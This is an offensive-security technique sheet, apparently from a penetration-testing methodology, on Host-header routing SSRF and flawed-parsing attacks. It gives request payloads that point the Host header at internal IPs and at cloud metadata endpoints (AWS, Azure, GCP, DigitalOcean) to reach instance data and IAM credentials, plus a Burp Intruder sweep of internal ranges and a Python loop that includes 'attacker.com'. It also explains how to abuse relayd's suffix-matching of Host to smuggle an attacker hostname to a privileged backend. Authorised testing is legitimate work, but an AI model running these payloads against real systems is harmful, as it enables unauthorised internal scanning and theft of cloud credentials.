# Host Header — Routing-Based SSRF + Flawed Parsing

## When this applies

- Front-end load balancer routes requests by Host header to internal back-ends.
- Front-end accepts arbitrary Host values; the back-end resolves Host to internal IPs.
- Goal: probe the internal network or hit cloud metadata via the load balancer.

## Technique

Set Host to an internal IP (192.168.0.1) or cloud metadata IP (169.254.169.254). The front-end forwards the request to that target. Combine with absolute-URL request line for parsers that disagree.

## Steps

### Indicators

- Load balancer/proxy in use
- Modified Host header still returns responses
- Internal network accessible

### Internal network scanning

```http
GET / HTTP/1.1
Host: 192.168.0.1
```

**Burp Intruder payload:**
```python
Host: 192.168.0.§0§
# Payload type: Numbers (0-255)
```

### Cloud metadata access

```http
Host: 169.254.169.254  # AWS, Azure, GCP
Host: metadata.google.internal  # GCP
```

### Internal IP ranges to test

```
10.0.0.0/8      (10.0.0.0 - 10.255.255.255)
172.16.0.0/12   (172.16.0.0 - 172.31.255.255)
192.168.0.0/16  (192.168.0.0 - 192.168.255.255)
127.0.0.0/8     (127.0.0.1 - 127.255.255.255)
169.254.0.0/16  (Link-local, cloud metadata)
```

### Cloud metadata endpoints

```http
# AWS
Host: 169.254.169.254
Path: /latest/meta-data/
Path: /latest/user-data/
Path: /latest/dynamic/instance-identity/

# Azure
Host: 169.254.169.254
Path: /metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Google Cloud
Host: metadata.google.internal
Host: 169.254.169.254
Path: /computeMetadata/v1/
Header: Metadata-Flavor: Google

# DigitalOcean
Host: 169.254.169.254
Path: /metadata/v1/
```

### SSRF via flawed parsing — absolute URL

When standard Host modification is blocked but the request line accepts absolute URLs:

```http
GET https://legitimate-domain.com/ HTTP/1.1
Host: 192.168.0.1
```

The front-end may route by Host while the back-end fetches the URL line. Different parsers disagree → access internal resources.

### Network scanning workflow

```
1. Send request to Intruder
2. Position payload: Host: 192.168.0.§0§
3. Payload type: Numbers (0-255, step 1)
4. Start attack
5. Analyze responses for differences
6. Investigate interesting IPs
```

### Custom Python script

```python
hosts = [
    'localhost',
    '127.0.0.1',
    'attacker.com',
    '192.168.0.1',
    '169.254.169.254',
]

for host in hosts:
    response = request(url, headers={'Host': host})
    analyze(response)
```

## Verifying success

- Different responses for different internal IPs (some 200, some timeout, some 502).
- Cloud metadata returns expected JSON (instance-id, IAM credentials).
- Burp Collaborator records DNS resolution from internal address space.

## Per-front-end Host matching semantics

Different reverse proxies/web servers match the `Host` header differently — the matching shape determines whether smuggling-style host-header injection works:

| Front-end | Default match | Notes |
|---|---|---|
| nginx `server_name` | exact, then wildcard `*.X` | `*.example.com` matches `a.example.com` only one label deep; `~regex` is the escape hatch |
| Apache `ServerAlias` | exact (with optional wildcard via `*.X`) | Same single-label semantics as nginx |
| HAProxy `hdr(host) -m str` | exact; `-m sub` / `-m beg` / `-m end` are opt-in | Operator must explicitly enable substring matching |
| **OpenBSD relayd** `match request header "Host" value "*X"` | **suffix match by default** | `*employees.example.com` matches `gymxemployees.example.com`, `foo.bar.employees.example.com`, etc. — this is the outlier |
| Caddy `@host` matchers | exact unless `host_regexp` | Conservative |
| AWS ALB `host-header` rules | exact, plus single `*` wildcard | Same as nginx |

The OpenBSD relayd suffix-match is the gotcha worth knowing: a vhost rule intended to match `employees.example.com` will also accept attacker-controlled `Host: AAAAemployees.example.com`. Useful when a public vhost reflects the `Host` header into a password-reset URL or email link AND the form posts to a different vhost — the suffix match smuggles the attacker hostname while still routing to the privileged backend.

Detection: probe with `Host: AAAA<target_suffix>` and confirm the request reaches the protected backend.

## Common pitfalls

- Some load balancers normalize Host before routing — bypass impossible there.
- IMDSv2 requires `X-aws-ec2-metadata-token` header — Host-only SSRF doesn't reach.
- Internal IPs may have egress firewalls blocking responses — use timing differential.

## Tools

- Burp Suite Intruder (Sniper, IP wordlist)
- Burp Collaborator (out-of-band confirmation)
- Custom Python with `requests`
